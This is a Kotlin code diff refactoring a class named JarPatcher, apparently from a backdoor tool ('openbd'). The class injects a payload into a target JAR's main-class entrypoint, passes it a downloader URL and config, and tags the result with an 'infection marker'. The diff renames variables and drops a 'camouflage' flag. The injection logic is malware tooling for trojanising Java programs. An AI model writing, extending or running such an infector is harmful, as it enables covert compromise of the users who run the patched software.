@@ -20,7 +20,6 @@ import java.nio.file.StandardCopyOption
 internal class JarPatcher(
     private val inputPath: Path,
     private val outputPath: Path,
-    private val camouflage: Boolean,
     private val config: Config,
     private val configJson: String,
     private val downloaderUrl: String,
@@ -39,33 +38,33 @@ internal class JarPatcher(
             throw IOException("Input file does not exist: $inputPath")
         }
 
-        logger.task("Patching ${inputPath.fileName}")
         val tempDir = Files.createTempDirectory("openbd_patch_")
-        val tempJarPath = tempDir.resolve(inputPath.fileName)
+        val workingCopyPath = tempDir.resolve(inputPath.fileName)
 
         try {
-            Files.copy(inputPath, tempJarPath, StandardCopyOption.REPLACE_EXISTING)
+            Files.copy(inputPath, workingCopyPath, StandardCopyOption.REPLACE_EXISTING)
+
+            logger.task("Patching ${inputPath.fileName}")
 
             logger.info("[STEP 1] Analyzing target JAR...")
-            if (infectionMarker.isAlreadyPatched(tempJarPath)) {
+            if (infectionMarker.isAlreadyPatched(workingCopyPath)) {
                 logger.finish().warn("Target is already patched. Skipping.")
                 return false
             }
-            val targetInfo = jarAnalyzer.analyze(tempJarPath)
-            val dominantVersion = versionScanner.findDominantVersion(tempJarPath)
+            val targetInfo = jarAnalyzer.analyze(workingCopyPath)
+            val dominantVersion = versionScanner.findDominantVersion(workingCopyPath)
             logger.info(" -> Found main class: ${brightCyan(targetInfo.mainClassName)}")
             logger.info(" -> Dominant Java version: ${brightCyan("Major " + dominantVersion.major)} (e.g., Java ${dominantVersion.major - 44})")
 
             logger.info("[STEP 2] Processing payload...")
             val rawPayload = payloadLoader.loadDefault()
             val processedPayload = payloadProcessor.process(
-                rawPayload,
-                camouflage,
-                tempJarPath.toFile(),
-                dominantVersion,
-                config,
-                configJson,
-                downloaderUrl
+                rawPayloadClasses = rawPayload,
+                targetJar = workingCopyPath.toFile(),
+                dominantVersion = dominantVersion,
+                config = config,
+                configJson = configJson,
+                downloaderUrl = downloaderUrl
             )
 
             logger.info("[STEP 3] Patching main class entrypoint...")
@@ -75,12 +74,13 @@ internal class JarPatcher(
             )
 
             logger.info("[STEP 4] Assembling final JAR file...")
-            jarAssembler.assemble(tempJarPath, modifiedMainClassBytes, targetInfo.mainClassPath, processedPayload)
-            infectionMarker.set(tempJarPath)
+            jarAssembler.assemble(workingCopyPath, modifiedMainClassBytes, targetInfo.mainClassPath, processedPayload)
+            infectionMarker.set(workingCopyPath)
 
-            Files.copy(tempJarPath, outputPath, StandardCopyOption.REPLACE_EXISTING)
+            Files.move(workingCopyPath, outputPath, StandardCopyOption.REPLACE_EXISTING)
+
             logSummary(targetInfo, processedPayload)
-            logger.finish().info("Successfully patched ${inputPath.fileName} -> ${green(outputPath.fileName.toString())}")
+            logger.finish().info("Patching process completed successfully.")
             return true
 
         } catch (e: Exception) {
